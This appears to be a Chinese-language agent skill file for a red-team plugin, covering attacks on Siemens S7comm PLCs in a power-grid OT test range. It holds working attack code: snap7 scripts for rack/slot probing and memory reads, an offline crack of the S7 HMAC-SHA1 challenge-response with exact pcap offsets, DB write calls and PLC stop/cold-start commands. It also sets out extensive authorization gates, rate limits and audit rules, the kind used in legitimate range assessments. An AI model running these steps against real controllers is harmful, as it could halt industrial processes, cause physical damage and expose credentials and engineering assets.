---
name: f2x-power-s7comm-attack
description: 电力 OT 靶场 Siemens S7comm 102 端口安全评估技能——协议识别、CPU 型号与序列号固件读取、机架槽位探测、内存区读取、保护级别判定与口令离线爆破，含启停控制高危二次确认门禁。
whenToUse: 目标开放 102/tcp 且疑似 Siemens SIMATIC S7 系列（S7-300/400/1200/1500），需要读取 CPU 信息、还原机架槽位、判定保护级别，或在授权隔离靶场内验证停止/启动控制风险时使用。
---

# S7comm 电力 OT 攻击面技能（f2x-power-s7comm-attack）

> **工具可用性与退路（先读这一节）**
> 本技能只依赖本插件自带的 `f2x_orchestrate_*` 工具，**不依赖任何其他插件**。
> 工作流里出现的 `redteam_coverage_mark` / `redteam_finding_register` 是**可选增强**：
> - **成果登记** → `f2x_orchestrate_finding`（本插件自带）
> - **覆盖矩阵** → 本插件无此面；用 `f2x_orchestrate_export` 作为覆盖记录，
>   或仅在部署里确实有 `redteam_coverage_mark` 时才回写
> **规则**：目录里没有的工具一律不要调用。开场先跑 `f2x_orchestrate_doctrine` 自检。

> **定位**：本技能只覆盖 **Siemens S7comm（102/tcp）** 协议面。Modbus 见 `f2x-power-modbus-attack`；上位机与工程师站识别见 `f2x-power-scada-recon`；IEC 61850 见 `f2x-power-iec61850-analysis`；流量回溯与防守视角见 `f2x-power-traceback`。
>
> **协议事实（来源：`$REDTEAM_REFS/awesome-industrial-protocols/protocols/s7comm.md`）**：S7comm 于 102/tcp，别名 S7 / S7commPlus；Nmap NSE `s7-info.nse`（官方）与 `s7-enumerate.nse`（DigitalBond Redpoint）；Wireshark 解析器 `packet-s7comm.c`；参考实现 Snap7 / python-snap7、s7scan、s7-pcaps（STEP7/WinCC ↔ S7-300/400 真实抓包）。
>
> **历史坐标（选自同目录参考素材）**：Stuxnet、《A Decade After Stuxnet: How Siemens S7 is Still an Attacker's Heaven》(BH 2024)、《Breaking Siemens SIMATIC S7 PLC Protection Mechanism》(HITB 2021)、《Fuzzing and Breaking Security Functions of SIMATIC PLCs》(BHEU 2022)、《Nope, S7ill Not Secure: Stealing Private Keys From S7 PLCs》(BHUSA 2024)、Rogue7（伪造工程师站）、《PLC-Blaster: A worm Living Solely In The PLC》(BHASIA 2016)、《The spear to break the security wall of S7CommPlus》(DEF CON 25)。
>
> **最高危红线**：本技能包含 **PLC 停止/启动控制**（`plc_stop`）。在默认配置下该动作由门禁**直接拒绝**，只有"隔离仿真靶场 + 指挥官二次确认 + 先写审计日志 + 明确恢复方案 + 现场有人值守"五条件同时满足才可执行。详见「安全约束」与「OT 影响评估」。

---

## 操作步骤

> **⚠️ 关于 `evidence/tools/ot_guard.py`（必读）**
>
> 本技能多处引用 `evidence/tools/ot_guard.py`，它是**你工作区里的一个辅助脚本，本插件不随包提供**。
> 在创建它之前，下面这些 `ot_guard.py` 命令会直接失败。两个选择：
>
> 1. **用本插件真实存在的门禁兜底（推荐）**：所有写操作在上报前先用
>    `f2x_orchestrate_audit` 登记并取得二次确认——本插件的审计门禁会**按动作文本**判定
>    "只读 / 需确认 / 禁止"，写操作没有 `confirmedBy` 一律拒绝，删除与脱库类**硬拒**。
>    这是本插件里**唯一实际生效**的门禁路径。
> 2. **自行实现 `ot_guard.py`**：按本技能「安全约束」一节列出的门禁值（白名单、并发上限、
>    限速、审计可写性）自行编写，并保留它的范围声明与操作配对记录。
>
> 本包**不声称**任何 `ot_guard.py` 层面的保护——没有那个文件时它不存在。


### 0. 授权与前置门禁（未完成不得进入第 1 步）

```bash
python3 evidence/tools/ot_guard.py scope --declared "10.10.0.0/24" \
  --authorization "RANGE-2026-POWER-A" --operator "$(whoami)"
mkdir -p evidence/audit evidence/s7comm
python3 evidence/tools/ot_guard.py selftest
```

统一门禁值（全技能一致）：

```python
AUTHORIZED_SCOPE = ("10.10.0.0/24", "192.168.1.0/24")
# AUTHORIZED_SCOPE += ("192.168.90.0/24", "192.168.95.0/24")   # GRFICS 叠加段，须显式启用
MAX_CONCURRENCY  = 3
MIN_INTERVAL_S   = 1.0
AUDIT            = "evidence/audit/ot-ops.jsonl"
FORBIDDEN_ONLINE_BRUTEFORCE = True     # S7 口令只允许离线爆破
```

### 1. 被动确认（先看流量）

S7 通信是**长连接、小帧、周期性**的；先看清谁在跟谁说话，再决定是否主动探测：

```bash
# 1.1 镜像口抓包（102/tcp 长连接）
sudo tcpdump -i eth0 -nn -s0 -w evidence/s7comm/passive-$(date +%s).pcap \
  'tcp port 102' -G 600 -W 1

# 1.2 会话与角色判定：源端口 102 的固定轮询方 = 工程师站 / WinCC 服务器
tshark -r evidence/s7comm/passive-*.pcap -q -z conv,tcp | grep ':102'
tshark -r evidence/s7comm/passive-*.pcap -Y 's7comm' -T fields \
  -e frame.number -e frame.time_relative -e ip.src -e ip.dst \
  -e s7comm.rosctr -e s7comm.param.func -e s7comm.header.pduref | head -40

# 1.3 判断是 S7comm 还是 S7commPlus（S7-1200 固件 ≥4.0 / S7-1500 常见）
#     S7commPlus 不再是明文 0x32 结构，tshark 不会解出 s7comm 层
tshark -r evidence/s7comm/passive-*.pcap -Y 'tcp.port==102 && !s7comm' -c 5 -V | head -60
```

### 2. 协议与设备指纹（低频）

```bash
# 2.1 端口态 + 版本探测（T2 限速，绝不用 -T4/-T5）
nmap -Pn -sT -p 102 -T2 --max-rate 10 --max-parallelism 1 --host-timeout 120s 10.10.0.5

# 2.2 s7-info：读 SZL 组件识别，产出 CPU 型号 / 序列号 / 固件 / 模块名 / 机架槽位
nmap -Pn -sT -p 102 -T2 --max-rate 10 --script s7-info \
  --script-args s7-info.timeout=8 10.10.0.5 \
  -oN evidence/s7comm/10.10.0.5-102-s7-info.txt

# 2.3 s7-enumerate（Redpoint，需放入 ./nse/）：枚举块清单（OB/FB/FC/DB）
mkdir -p nse && cp /opt/redpoint/*.nse nse/
nmap -Pn -sT -p 102 -T2 --max-rate 10 \
  --script ./nse/s7-enumerate.nse --script-args s7-enumerate.timeout=8 10.10.0.5 \
  -oN evidence/s7comm/10.10.0.5-102-s7-enumerate.txt

# 2.4 s7scan：网段级 S7 资产台账（慢速；这是"枚举"不是"爆破"）
python3 s7scan.py -p 102 10.10.0.5                 # 单机
python3 s7scan.py -p 102 --timeout 3 10.10.0.0/24  # ⚠️ 仅靶场段；每主机单次连接
```

### 3. 帧结构确认（用于证据描述与自造探测帧）

S7 over TCP 是三层封装，判读时必须逐层对齐：

| 层 | 结构 | 关键字段 |
|---|---|---|
| **TPKT**（RFC1006） | `03 00 <总长:2>` | 版本恒 `0x03`；第 3–4 字节为含头总长 |
| **COTP** | CR `11 e0 ...`／CC `0f d0 ...`／DT `02 f0 80` | TSAP 编码机架槽位：`<rack*32+slot>` 高字节为连接类型（`0x01` PG / `0x02` OP） |
| **S7comm** | `32 <rosctr> 00 00 <pduref:2> <param_len:2> <data_len:2>` | 协议 id 恒 `0x32` |

- `rosctr`：`0x01` Job（请求）、`0x02` Ack、`0x03` Ack_Data（响应）、`0x07` Userdata。
- 常用 `param.func`：`0xF0` Setup Communication、`0x04` Read Var、`0x05` Write Var、`0x1A/0x1B/0x1C` 下载块、`0x1D/0x1E/0x1F` 上传块、`0x28` PI-Service、`0x29` PLC Stop、`0x27` 安全/口令（Set Password 类交互）。
- 读 SZL（CPU 识别信息）走 **Userdata**：`rosctr=0x07`、功能组 `0x04`、子功能 `0x01`（Read SZL）、SZL-ID `0x001C`（组件识别）/ `0x0011`（模块识别）/ `0x0132`（通信参数），索引 `0x0000`。`s7-info.nse` 就是这条路径。

```bash
# 逐层展开一帧，确认封装正确（证据截图/文本都靠它）
tshark -r evidence/s7comm/10.10.0.5-102-s7-info.pcap \
  -Y 's7comm.param.func == 0x04' -c 1 -V | sed -n '/TPKT/,/Data/p'
```

### 4. 机架 / 槽位探测

S7 连接必须给对 **rack / slot**，否则连接被拒。常见组合：

| CPU 系列 | rack | slot | 备注 |
|---|---|---|---|
| S7-300 | 0 | 2 | 经典组合 |
| S7-400 | 0 | 2 或 3 | 视机架与 CPU 型号 |
| S7-1200 / S7-1500 | 0 | 1 | 需 S7commPlus 能力（Python-snap7 对 1500 支持有限） |
| 软 PLC / 仿真（如 GRFICS snapshot） | 0 | 1 或 2 | 逐个确认 |

```python
# evidence/tools/s7_rack_slot.py —— 低频遍历（1 s 间隔、串行、异常即记录）
import snap7, time, json, datetime, itertools
TARGETS = ["10.10.0.5"]
audit = lambda r: open("evidence/audit/ot-ops.jsonl","a").write(json.dumps(r, ensure_ascii=False)+"\n")
for ip in TARGETS:
    for rack, slot in itertools.product([0,1], [0,1,2,3]):
        audit({"ts": datetime.datetime.now().astimezone().isoformat(),
               "op":"s7.connect","target":f"{ip}:102","rack":rack,"slot":slot,
               "class":"read","rate":"1 req/s","authorization":"RANGE-2026-POWER-A"})
        c = snap7.client.Client()
        try:
            c.connect(ip, rack, slot, 102)
            if c.get_connected():
                print(f"[+] {ip} rack={rack} slot={slot} OK state={c.get_cpu_state()}")
        except Exception as e:
            print(f"[-] {ip} rack={rack} slot={slot} {type(e).__name__}: {e}")
        finally:
            try: c.destroy()
            except Exception: pass
        time.sleep(1.0)      # 硬编码 ≥1 s，禁止去掉
```

### 5. PLC 信息读取（CPU 型号 / 序列号 / 固件）

```python
# evidence/tools/s7_cpu_info.py —— python-snap7，只读
import snap7, snap7.util, json
c = snap7.client.Client()
c.connect("10.10.0.5", 0, 1, 102)

info = c.get_cpu_info()                 # 返回对象，字段随版本变化
print("ModuleTypeName :", info.ModuleTypeName)   # CPU 型号，如 CPU 315-2 PN/DP
print("SerialNumber   :", info.SerialNumber)     # 序列号（资产唯一标识）
print("ASName         :", info.ASName)
print("Copyright      :", info.Copyright)
print("ModuleName     :", info.ModuleName)

print("CPU state      :", c.get_cpu_state())     # S7CpuStatusRun / S7CpuStatusStop / Unknown
print("Order code     :", c.get_order_code())    # 订货号 MLFB（若固件支持）

# SZL 直读（s7-info.nse 同源路径）：0x001C 组件识别 / 0x0011 模块识别
for szl_id, idx in ((0x001C, 0x0000), (0x0011, 0x0000), (0x0132, 0x0000)):
    try:
        data = c.read_szl(szl_id, idx)
        print(f"SZL 0x{szl_id:04X}/{idx}: {len(data.Data)} bytes")
        open(f"evidence/s7comm/10.10.0.5-szl-{szl_id:04x}.bin","wb").write(bytes(data.Data))
    except Exception as e:
        print(f"SZL 0x{szl_id:04X} 不可读（该固件不支持该 ID）: {e}")

c.destroy()
```

```bash
# 命令行等价物（不写代码时）
nmap -Pn -sT -p 102 -T2 --max-rate 10 --script s7-info 10.10.0.5
# s7-pcaps 参考素材：STEP7/WinCC ↔ S7-300/400 真实抓包，用于比对字段（离线，零发包）
tshark -r /opt/s7-pcaps/s7-300.pcap -Y 's7comm' -T fields \
  -e s7comm.param.func -e s7comm.header.rosctr | sort | uniq -c
```

### 6. 保护级别判定（只做判定，不做在线猜解）

S7-300/400 的访问保护通过 `param.func = 0x27`（安全/口令交互）体现：

- **无口令保护**：`0x27` 交互直接返回成功，随后 `0x04/0x05`（读写）与 `0x29`（启停）可用。
- **受口令保护**：PLC 返回 **challenge**，客户端需回一个正确 **response** 才能解锁。

```bash
# 6.1 只做一次交互判定保护级别（单帧、不携带任何口令猜测）
python3 evidence/tools/s7_protection_probe.py --target 10.10.0.5 --rack 0 --slot 1 --once

# 6.2 抓取这次交互（若目标受保护，本 pcap 就是离线爆破的输入）
sudo tcpdump -i eth0 -nn -s0 -w evidence/s7comm/10.10.0.5-auth-challenge.pcap \
  'host 10.10.0.5 and tcp port 102'
```

保护级别的证据价值：**"未受保护即可读写"= 未授权访问（confirmed）**；"受保护但可读取 CPU 信息"= 信息泄露（partial，因为 SZL 读取常不受保护级别约束）。

### 7. 内存区读取（DB / M / I / Q）

```python
# evidence/tools/s7_read_areas.py —— 只读，逐区域串行，1 s 间隔
import snap7, time, datetime, json
from snap7.type import Areas
c = snap7.client.Client(); c.connect("10.10.0.5", 0, 1, 102)
audit = lambda r: open("evidence/audit/ot-ops.jsonl","a").write(json.dumps(r, ensure_ascii=False)+"\n")

def read(area, db, start, size, label):
    audit({"ts": datetime.datetime.now().astimezone().isoformat(), "op":"s7.read_area",
           "target":"10.10.0.5:102","area":label,"db":db,"start":start,"size":size,
           "class":"read","rate":"1 req/s","authorization":"RANGE-2026-POWER-A"})
    try:
        data = c.read_area(area, db, start, size)
        print(f"[{label}] DB{db}.{start} +{size}: {data.hex()}")
        return data
    except Exception as e:
        print(f"[{label}] 读取失败: {e}")
    finally:
        time.sleep(1.0)

read(Areas.MK, 0, 0, 16, "M")     # 位存储区 M0.0..M15.7
read(Areas.PE, 0, 0, 16, "I")     # 过程映像输入
read(Areas.PA, 0, 0, 16, "Q")     # 过程映像输出
read(Areas.DB, 1, 0, 64, "DB1")   # DB1.DBB0..63 —— 工艺数据主战场
read(Areas.DB, 2, 0, 64, "DB2")
c.destroy()
```

```python
# 块上传（读工程逻辑）——只读但仍属"取走工程资产"，须记审计
# c.list_blocks() / c.get_block_info("DB","DB1") / c.upload("DB","DB1") → 落地为 .bin 后用 S7 反编译工具离线分析
# 注意：块上传在部分固件上会短时占用 CPU，务必串行 + 1 s 间隔 + 单块优先
```

原始 DB 字节 → 工程语义：用 `snap7.util` 解定标与类型（`get_int/get_real/get_bool`），或与上位机画面标签对照（见 `f2x-power-scada-recon`）。**REAL 型（IEEE754）与 INT 定标（×10/×100）都要试**，并用第二数据源交叉验证。

### 8. 口令离线爆破（**唯一允许的爆破形态**）

> **禁止在线爆破**（门禁第 6 条）。本节全部动作在**本地**完成，**不产生任何目标侧网络流量**。

原理（参考实现：`$REDTEAM_REFS/awesome-industrial-control-system-security/source/s7-brute-offline.py` 与 `s7-cracker.py`）：S7 口令验证是 **HMAC-SHA1 挑战应答** ——

```
response = HMAC_SHA1( key = SHA1(password), msg = challenge )
```

原脚本（Python 2 时代）的抓包定位判据与偏移：

| 角色 | 帧长（含 14 字节以太网头） | 载荷起始特征（hexlify 后 `[14:24]`） |
|---|---|---|
| challenge（PLC → 客户端） | `108` | `72 02 00 27 32` |
| response（客户端 → PLC） | `141` | `72 02 00 48 31` |
| 认证成功（PLC → 客户端） | `84` | `72 02 00 0f 32` |
| 认证失败（PLC → 客户端） | `92` | `72 02 00 17 32` |

- challenge 提取：`raw_challenge[46:52] == '100214'` 且 `raw_challenge[92:94] == '00'` 时取 `raw_challenge[52:92]`（20 字节）。
- response 提取：`raw_response[64:70] == '100214'` 且 `raw_response[110:112] == '00'` 时取 `raw_response[70:110]`。
- 离线比对：对字典每个口令计算 `HMAC_SHA1(SHA1(pwd), challenge)`，与 response 相等即命中。

```bash
# 8.1 先校验抓包中确实存在完整挑战应答（有成功认证帧才可爆破）
tshark -r evidence/s7comm/10.10.0.5-auth-challenge.pcap \
  -Y 's7comm.param.func == 0x27' -T fields -e frame.number -e ip.src -e tcp.len -e data.data

# 8.2 离线跑字典（原脚本为 py2；先做 py3 移植，见下）
python3 evidence/tools/s7-cracker.py evidence/s7comm/10.10.0.5-auth-challenge.pcap dict.txt
```

Python 3 移植要点（原脚本两处必须改）：

```python
# 原：challenge = challenge.decode("hex")
challenge = bytes.fromhex(challenge.decode() if isinstance(challenge, bytes) else challenge)

# 原：hmac.new(hashlib.sha1(password).digest(), challenge, hashlib.sha1).hexdigest()
def calculate_s7response(password: str, challenge: bytes) -> str:
    import hashlib, hmac
    return hmac.new(hashlib.sha1(password.encode()).digest(), challenge, hashlib.sha1).hexdigest()
```

```bash
# 8.3 字典与算力（本地）
hashcat 无 S7 模式 → 用 Python/OpenSSL 循环即可；10 万口令量级在本机分钟级完成
# 8.4 结果只写审计日志与 finding，不得回连目标"验证口令是否正确"（那就是在线爆破）
```

### 9. 写操作：DB / 内存区写入（**必须走二次确认门禁**）

```bash
# 9.1 申请写授权（无 ack-id 则门禁拒绝）
python3 evidence/tools/ot_guard.py request-write \
  --target 10.10.0.5 --op s7.db_write --area DB --db 1 --start 0 --size 2 \
  --rationale "验证 DB1.DBW0 可写性（该字被 OB1 每周期重写，属可恢复写入）" \
  --rollback "写回原值 0x0000（原值已记录）" --ttl 300

# 9.2 带 ack 执行
python3 evidence/tools/s7_db_write.py --ack cmd-051 \
  --target 10.10.0.5 --rack 0 --slot 1 --db 1 --start 0 --data 1234 --interval 1.0

# 9.3 回读 + 观察 PLC 逻辑覆盖行为
python3 evidence/tools/s7_read_areas.py --db 1 --start 0 --size 2
```

```python
# 等价 snap7 调用（仅供门禁通过后使用）
import snap7, struct
c = snap7.client.Client(); c.connect("10.10.0.5", 0, 1, 102)
c.db_write(1, 0, struct.pack(">h", 1234))          # DB1.DBW0 = 1234（big-endian）
# c.write_area(Areas.MK, 0, 0, b"\x01")            # M0.0 = 1
```

红线：**不得写保护定值、跳闸矩阵、安全联锁、计数器/定时器控制字**。这类地址的"可写性"只能用**读取证据 + 工程语义推断**证明，不做实际写入。块下载（`0x1A/0x1B/0x1C`，Program Download）属于**改动控制逻辑**，在默认配置下一律拒绝——它可致过程进入非预期状态且**无通用回滚**。

### 10. 启停控制（🔴 **最高危，五条件门禁**）

```bash
# 10.1 前置：必须显式声明五条件（缺一即拒绝）
python3 evidence/tools/ot_guard.py request-control \
  --target 10.10.0.5 --action plc_stop \
  --isolation "isolated-sim-only" \
  --commander-ack "REQUIRED" \
  --recovery "snap7.client.Client().plc_hot_start() ; 或现场 HMI 切 RUN" \
  --on-site-operator "REQUIRED" \
  --rationale "验证未授权 STOP 控制风险（靶场仿真，无真实负荷）"

# 10.2 带 ack 执行（执行前必须先落审计日志，执行后立即落第二条）
python3 evidence/tools/s7_plc_control.py --ack cmd-077 \
  --target 10.10.0.5 --rack 0 --slot 1 --action stop
```

```python
# 等价 snap7 调用 —— 每一项都是 🔴
c.plc_stop()        # 进入 STOP：所有输出按组态进入安全态/保持，生产控制停止
c.plc_hot_start()   # 热启动：恢复 RUN，保持性内存保留（首选恢复动作）
c.plc_cold_start()  # 冷启动：非保持性内存/DB 初值被重置 —— 破坏性更强，默认禁用
```

协议层语义（手工构帧时的判据，**不要手写魔数**）：STOP 请求为 `rosctr = 0x01`（Job）、`param.func = 0x29`（PI-Service）、参数域 `P_PROGRAM`、数据域 `STOP`。手工构造的帧**必须**先与**靶场自抓的参考 STOP 帧**逐字节 diff 后再使用；生产设备上不得出现手工构造的控制帧。

不可逆性说明（必须写进报告）：

- `STOP → RUN` 可用 `plc_hot_start()` 恢复；**但 STOP 期间的过程输出变化已经发生**，对真实过程可能已造成不可逆后果。
- `plc_cold_start()` 会重置非保持性内存与 DB 初值，**工程组态层面的数据丢失不可逆**。
- 若 PLC 组态了"通信中断 fallback"，则 STOP 本身可能连带触发下游联锁动作——**影响范围超出本机**。

### 11. S7commPlus（S7-1200 ≥4.0 / S7-1500）差异处理

- S7commPlus 不使用明文 `0x32` 结构（有会话/加密协商），tshark 解不出 `s7comm` 层（见第 1.3 步判据）。
- Python-snap7 对 S7-1500 支持有限；`plc_stop` 一类能力在 Plus 上需要专门实现。
- **只做识别与版本判定**，不进入 Plus 的认证绕过尝试（涉及固件私有算法，且有 PLC 变砖风险）。
- 参考：《The spear to break the security wall of S7CommPlus》(DEF CON 25)、《Stealing Private Keys From S7 PLCs》(BHUSA 2024)——用于说明**风险存在**，不作为本技能的操作步骤。

### 12. 证据固化

```bash
sha256sum evidence/s7comm/* > evidence/s7comm/SHA256SUMS
python3 evidence/tools/ot_guard.py audit-verify --expect-pairs
# 覆盖矩阵与 finding 回写（见「产出与证据」）
```

---

## 安全约束

> 以下六条为**硬编码门禁**，在任何目标、任何阶段、任何理由下不得豁免。由 `evidence/tools/ot_guard.py` 在工具调用前强制执行。

1. **单目标并发不超过 3 个工具调用。**
   同一目标 IP 上并发的发包/连接进程（nmap、s7scan、snap7 脚本、tshark 之外的探测器）总数 **≤ 3**，默认实现为 1（串行）。S7 是长连接协议，并发连接会占用 PLC 有限的连接资源（S7-300 通常仅数个 PG/OP 连接位），**连接耗尽本身就能让工程师站无法上线**。禁止多终端齐发、禁止 `xargs -P`、禁止并发遍历 rack/slot。超限即拒绝启动。

2. **模糊测试必须低频化，禁止高频扫描 OT 设备。**
   硬性限速参数：
   - 端口/主机扫描：`nmap -T2 --max-rate 10 --max-parallelism 1`（禁止 `-T3/-T4/-T5`、禁止 `--min-rate`）。
   - 同一目标两次 S7 请求/连接间隔 **≥ 1 秒**（`time.sleep(1.0)`，脚本内硬编码）。
   - 模糊测试（若在隔离仿真靶场执行）单帧速率 ≤ 1 req/s，总量封顶 **300 次/设备/小时**。
   - 熔断：连续 2 次连接超时 / 连续 2 次 `S7Error` 异常 / `get_cpu_state()` 变为 `S7CpuStatusStop` 且非本技能所为 → **立即停止该设备全部探测并退避 60 秒**，写审计日志后由指挥官裁决。
   - 禁止对 PLC 执行任何形式的协议模糊器（Sulley/boofuzz 等）——历史上已多次导致 PLC 进入 STOP 或通信模块假死。

3. **写操作（寄存器写入、线圈强制、固件修改、PLC 启停）必须经过指挥官二次确认，且记入审计日志。**
   涵盖：`func=0x05`（Write Var）、块下载 `0x1A/0x1B/0x1C`（Program Download）、`func=0x29`（PLC Stop）、`plc_hot_start`/`plc_cold_start`、以及任何固件/组态写动作。流程强制为：`request-write`/`request-control` 拿 `ack-id` → 指挥官显式确认 → 带 `ack-id` 执行 → **执行前**写审计日志、执行后写结果日志 → 回读确认。无 `ack-id` 的写/控制命令由门禁拒绝。**"口头说过了"不构成凭据。**

4. **任何可能影响工控设备正常运行的命令，必须先记录到审计日志再执行。**
   保守判据：**凡不能证明是纯只读，就先记日志**。S7 场景下需先记日志的高风险只读动作包括：块上传/枚举（`0x1D/0x1E/0x1F`、`s7-enumerate`）、SZL 全量遍历、`0x27` 保护级别交互（会点亮 PLC 的安全计数/日志）、长连接建立（占用连接位）。**先记后做，禁止事后补记。** 审计条目含 `ts`（ISO8601 带时区）、`op`、`target`、`rack`/`slot`、`area`/`db`/`start`/`size`、`class`（read/write/control/fuzz）、`rate`、`authorization`、`commander_ack`、`rollback`、`purpose`、`before_state`；写/控制操作前后各一条，成对可核。

5. **目标范围白名单硬编码，超出白名单一律拒绝执行。**
   ```python
   AUTHORIZED_SCOPE = ("10.10.0.0/24", "192.168.1.0/24")   # 已授权电力靶场段
   # 授权靶场叠加段（须在授权书范围内显式启用；默认关闭）
   # AUTHORIZED_SCOPE += ("192.168.90.0/24", "192.168.95.0/24")
   ```
   所有连接前台先跑 `assert_in_scope(ip)`（`ipaddress.ip_address(host) in ipaddress.ip_network(cidr)`），**不匹配即 `sys.exit(2)` 并记录拒绝日志**。域名先解析再判定，禁用以域名/别名绕过；禁止把范围外包给 `-iL` 文件；`s7scan` 网段扫描前必须逐主机先通过白名单校验，禁止直接对未授权段发起网段遍历。

6. **禁止 DDoS，禁止爆破；S7 口令只允许离线爆破参考脚本，禁止在线爆破。**
   - 禁止 DoS/DDoS 与泛洪：禁止连接耗尽、禁止 `hping3 --flood`、禁止命令/数据泛洪、禁止用高频 `0x27` 交互压制 PLC 安全逻辑。
   - **禁止在线口令爆破**：不得对 102/tcp 做任何字典/暴力口令尝试（不得循环"连接 → 送口令 → 看结果"）。S7 口令的唯一合法路线是**离线**：从已捕获 pcap 提取 challenge/response → 本地字典比对（`s7-cracker.py` / `s7-brute-offline.py`），全程零网络流量。
   - 离线命中后的口令**不得回连目标做"在线验证"**——那已构成在线爆破，直接违反本条。
   - 禁止使用默认口令/已知口令做在线登录尝试（S7 与 S7commPlus 皆同）。

---

## OT 影响评估

| 等级 | 本技能中的操作 | 影响机制 | 缓解/边界 |
|---|---|---|---|
| 🟢 **只读** | 被动抓包与 tshark 离线解析（第 1 步）、端口态确认（2.1）、`s7-info`（SZL 组件识别，第 2.2 / 第 5 步）、`get_cpu_info`/`get_cpu_state`、内存区读取（第 7 步，`Areas.DB/MK/PE/PA` 读） | 不改变过程变量；`read_area` 走过程映像，PLC 侧为纯查询 | 1 s 间隔；并发 ≤3；SZL 读取在个别固件上短暂占用 CPU → 串行执行 |
| 🟢/🟡 **边界** | `s7-enumerate` 块清单枚举、块上传（`0x1D/0x1E/0x1F`，读工程逻辑）、`0x27` 保护级别单次交互、长连接建立 | 不改变过程值，但会**占用 PLC 的 PG/OP 连接资源**并可能在 PLC 诊断缓冲区留下条目 | 单块优先、串行、1 s 间隔；发现连接被拒即停止；先写审计日志 |
| 🟡 **可恢复写入** | `func=0x05` 写 DB/位存储区地址，且该地址**被用户程序每扫描周期覆盖**（映像区） | 下一扫描周期被程序值覆盖，输出瞬时抖动后被拉回 | 二次确认 + 先审计 + 记录原值 + 回读确认 + 执行前后各留 5 s 观察窗 |
| 🔴 **不可逆 / 停机风险** | `plc_stop()`（`func=0x29` PI-Service `P_PROGRAM`/`STOP`）、`plc_cold_start()`（重置非保持性内存与 DB 初值）、块下载 `0x1A/0x1B/0x1C`（改写控制逻辑，**无通用回滚**）、写保护定值/跳闸矩阵/安全联锁地址、固件写入、S7commPlus 认证绕过尝试 | 生产控制停止、输出进安全态或保持、下游联锁动作、工程组态被覆盖、设备变砖 | **默认拒绝**；仅"隔离仿真靶场 + 指挥官二次确认 + 先审计后执行 + 明确恢复方案（首选 `plc_hot_start()`）+ 现场有人值守"五条件齐备才可执行；`plc_cold_start` 与块下载默认禁用 |
| 🔴 **停机风险** | 取消限速的模糊测试、并发连接 >3、连接资源耗尽、在线口令爆破 | PLC 连接位耗尽 → 工程师站/WinCC 无法上线（**等于失去监视与控制手段**）；部分固件在连接压力下直接 STOP | 门禁强制禁止；熔断即退避 60 s 并上报 |
| ⚫ **绝对禁止** | 任何 DoS/DDoS 泛洪、在线口令爆破、生产设备上的启停/下载/固件写入 | 直接停机、设备损坏、过程事故 | 门禁硬拒绝，不设例外 |

**一句话结论**：本技能的**信息读取面**（CPU 型号/序列号/固件、DB 内容、保护级别）风险低但价值高，足以支撑"资产唯一标识 + 工程信息泄露 + 未授权访问"三类 finding；**启停与下载面**是电力 OT 的**最高危动作**，默认立场是**只看不按**——用"可写性证据 + 工程语义"证明风险，把实际 STOP 严格限制在隔离仿真靶场。

---

## 产出与证据

### 必交交付物

| # | 交付物 | 路径 | 计分要点 |
|---|---|---|---|
| 1 | 范围声明与门禁自检 | `evidence/audit/ot-ops.jsonl`（首条 scope 声明；写/控制操作成对条目） | 全程白名单内 + 限速合规 + 写操作有 ack-id |
| 2 | S7 资产台账 | `evidence/s7comm/10.10.0.5-102-s7-info.txt` + `s7scan` 输出 | IP、端口、机架/槽位、模块名 |
| 3 | **CPU 身份指纹（核心）** | `evidence/s7comm/10.10.0.5-cpu-info.md` | ModuleTypeName（CPU 型号）、SerialNumber（**资产唯一标识**）、固件版本、订货号 MLFB、ASName |
| 4 | 机架/槽位探测矩阵 | `evidence/s7comm/10.10.0.5-rack-slot.csv` | 每个 (rack,slot) 的连通性与 `get_cpu_state()` |
| 5 | SZL 原始数据 | `evidence/s7comm/10.10.0.5-szl-{001c,0011,0132}.bin` | 可离线复解，不依赖二次连设备 |
| 6 | 保护级别判定 | `evidence/s7comm/10.10.0.5-protection-level.md` + `-auth-challenge.pcap` | 判定依据（`0x27` 交互结果）与未授权读写可行性结论 |
| 7 | DB / 内存区读取证据 | `evidence/s7comm/10.10.0.5-areas-read.csv` | `area,db,start,size,hex,decoded,meaning,confidence` |
| 8 | 工程块清单 | `evidence/s7comm/10.10.0.5-s7-enumerate.txt` | OB/FB/FC/DB 清单（证明可完整取走工程资产） |
| 9 | 口令离线爆破报告（如适用） | `evidence/s7comm/offline-crack-result.md` | **必须声明"零网络流量"**，附 challenge/response 十六进制与命中口令（或未命中结论）；禁止任何在线验证痕迹 |
| 10 | 启停/写操作审批链（如执行） | `evidence/s7comm/control-approval-<opid>.json` + 审计成对条目 + 恢复动作记录 | 五条件齐备证据 + 执行前后 `get_cpu_state()` 对比 + 恢复成功证据 |
| 11 | 未授权访问三件套 | `evidence/s7comm/<target>-unauth-{baseline,diff.pcap,marker}.txt` | 基线（正常轮询）+ 差分（我方无凭据请求）+ marker 回显 |
| 12 | finding 登记 | `f2x_orchestrate_finding`（本插件自带） | finding：CPU 信息泄露 / 未授权读写 / 无口令保护即可 STOP；`evidenceLevel=confirmed` 或 `impact` |

### 证据质量要求

- **只读优先**：能用读取证据说明风险的，绝不用写操作去"证明"。**"能 STOP" 的结论可由"无保护级别 + `0x29` 可用"推导，无需真的 STOP。**
- **可复现**：每条命令含完整限速参数；原始 SZL/DB 字节落盘，允许离线复解。
- **可对照**：CPU 型号/序列号要与 `s7-info.nse` 输出、`get_cpu_info()` 输出、被动抓包三方一致；单来源不算证据。
- **危险动作留痕**：任何 🔴 动作必须留下"审批 → 执行前审计 → 执行 → 执行后审计 → 恢复 → 恢复验证"六段完整链，缺段即视为违规操作。
- **诚实标注**：区分"设备不支持"与"探测被拒/超时"；把 `NO-RESPONSE`、`S7Error` 原样记录（打不通本身就是结论，也可能是门禁或设备已受扰）。

### 速用命令卡

```bash
# 指纹（只读，限速）
nmap -Pn -sT -p 102 -T2 --max-rate 10 --script s7-info 10.10.0.5
# CPU 信息（只读，snap7）
python3 -c "import snap7;c=snap7.client.Client();c.connect('10.10.0.5',0,1,102);i=c.get_cpu_info();print(i.ModuleTypeName,i.SerialNumber);print(c.get_cpu_state())"
# 读 DB1（只读）
python3 -c "import snap7;c=snap7.client.Client();c.connect('10.10.0.5',0,1,102);print(c.db_read(1,0,32).hex())"
# 离线口令爆破（零网络流量）
python3 evidence/tools/s7-cracker.py capture.pcap dict.txt
# ❌ 禁止：plc_stop/plc_cold_start 未走门禁 / 块下载 / 在线口令爆破 / nmap -T4 / 连接泛洪 / 协议模糊器
```

### 与其他技能的衔接

